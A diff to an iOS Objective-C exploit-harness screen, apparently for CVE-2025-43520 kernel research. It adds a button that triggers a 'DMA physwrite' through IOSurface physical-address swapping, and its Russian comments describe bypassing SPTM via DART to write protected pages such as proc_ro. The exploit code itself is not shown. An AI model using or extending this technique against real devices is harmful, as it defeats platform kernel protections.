@@ -24,6 +24,7 @@
 @property (nonatomic, strong) UIButton *m2tButton;
 @property (nonatomic, strong) UIButton *jpegButton;
 @property (nonatomic, strong) UIButton *m2oButton;
+@property (nonatomic, strong) UIButton *dmaButton;
 @property (nonatomic, strong) UIButton *shareButton;
 @property (nonatomic, strong) UILabel *statusLabel;
 @property (nonatomic, copy, nullable) NSString *reportPath;
@@ -46,7 +47,7 @@
     titleLabel.textAlignment = NSTextAlignmentCenter;
 
     UILabel *subtitle = [self makeLabel:13 weight:UIFontWeightRegular color:[UIColor colorWithRed:0.55 green:0.85 blue:0.65 alpha:1.0]];
-    subtitle.text = @"CVE-2025-43520 · ClearSword · дамп SPTM/TXM · 1.9.100";
+    subtitle.text = @"CVE-2025-43520 · ClearSword · дамп SPTM/TXM · 1.9.101";
     subtitle.textAlignment = NSTextAlignmentCenter;
 
     self.statusLabel = [self makeLabel:13 weight:UIFontWeightSemibold color:[UIColor secondaryLabelColor]];
@@ -112,6 +113,12 @@
                                 color:[UIColor colorWithRed:0.16 green:0.45 blue:0.55 alpha:1.0]];
     [self.m2oButton addTarget:self action:@selector(m2oTapped) forControlEvents:UIControlEventTouchUpInside];
 
+    // DMA physwrite через подмену backing PA поверхности (DART мимо SPTM):
+    // контрольная страница → маркер; дальше защищённая страница (proc_ro).
+    self.dmaButton = [self makeButton:@"DMA physwrite (IOSurface PA swap)"
+                                color:[UIColor colorWithRed:0.55 green:0.45 blue:0.12 alpha:1.0]];
+    [self.dmaButton addTarget:self action:@selector(dmaTapped) forControlEvents:UIControlEventTouchUpInside];
+
     self.shareButton = [self makeButton:@"Поделиться отчётом"
                                   color:[UIColor colorWithRed:0.25 green:0.35 blue:0.60 alpha:1.0]];
     [self.shareButton addTarget:self action:@selector(shareTapped) forControlEvents:UIControlEventTouchUpInside];
@@ -135,6 +142,7 @@
     [self.view addSubview:self.m2tButton];
     [self.view addSubview:self.jpegButton];
     [self.view addSubview:self.m2oButton];
+    [self.view addSubview:self.dmaButton];
     [self.view addSubview:self.shareButton];
 
     UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
@@ -199,7 +207,12 @@
         [self.m2oButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
         [self.m2oButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
         [self.m2oButton.heightAnchor constraintEqualToConstant:38],
-        [self.m2oButton.bottomAnchor constraintEqualToAnchor:self.shareButton.topAnchor constant:-8],
+        [self.m2oButton.bottomAnchor constraintEqualToAnchor:self.dmaButton.topAnchor constant:-7],
+
+        [self.dmaButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
+        [self.dmaButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
+        [self.dmaButton.heightAnchor constraintEqualToConstant:38],
+        [self.dmaButton.bottomAnchor constraintEqualToAnchor:self.shareButton.topAnchor constant:-8],
 
         [self.shareButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
         [self.shareButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
@@ -263,6 +276,7 @@
     [self setExperimentButton:self.m2tButton enabled:krw];
     [self setExperimentButton:self.jpegButton enabled:krw];
     [self setExperimentButton:self.m2oButton enabled:krw];
+    [self setExperimentButton:self.dmaButton enabled:krw];
 }
 
 - (void)appendLogText:(NSString *)text {
@@ -639,6 +653,19 @@
     }];
 }
 
+- (void)dmaTapped {
+    [self runDiagnosticWithStatus:@"DMA physwrite: поиск surface → подмена PA → scaler submit…" work:^NSDictionary *{
+        return @{@"report": [KPDump iosurfacePaSwapReport]};
+    } completion:^(NSDictionary *result) {
+            NSString *report = result[@"report"];
+            BOOL win = [report containsString:@"PHYSWRITE DMA CONFIRMED"];
+            self.statusLabel.text = win ? @"DMA PHYSWRITE CONFIRMED — защищённые страницы следующие"
+                                        : @"DMA physwrite завершён — см. лог";
+            [self appendLogText:report];
+            [self saveExperimentReport:report fileName:@"kexproof-paswap.txt"];
+    }];
+}
+
 - (void)shareTapped {
     NSMutableArray *items = [NSMutableArray array];
     if (self.reportPath) {
@@ -655,7 +682,7 @@
         [items addObject:[NSURL fileURLWithPath:prev]];
     }
     // инкрементальные файлы стадий (переживают панику)
-    for (NSString *fn in @[@"kexproof-gart.txt", @"kexproof-pac.txt", @"kexproof-m2teardown.txt", @"kexproof-jpeg.txt", @"kexproof-reachability.txt", @"kexproof-m2oracle.txt"]) {
+    for (NSString *fn in @[@"kexproof-gart.txt", @"kexproof-pac.txt", @"kexproof-m2teardown.txt", @"kexproof-jpeg.txt", @"kexproof-reachability.txt", @"kexproof-m2oracle.txt", @"kexproof-paswap.txt"]) {
         NSString *fp = [NSHomeDirectory() stringByAppendingPathComponent:[@"Documents/" stringByAppendingString:fn]];
         if ([[NSFileManager defaultManager] fileExistsAtPath:fp]) {
             [items addObject:[NSURL fileURLWithPath:fp]];
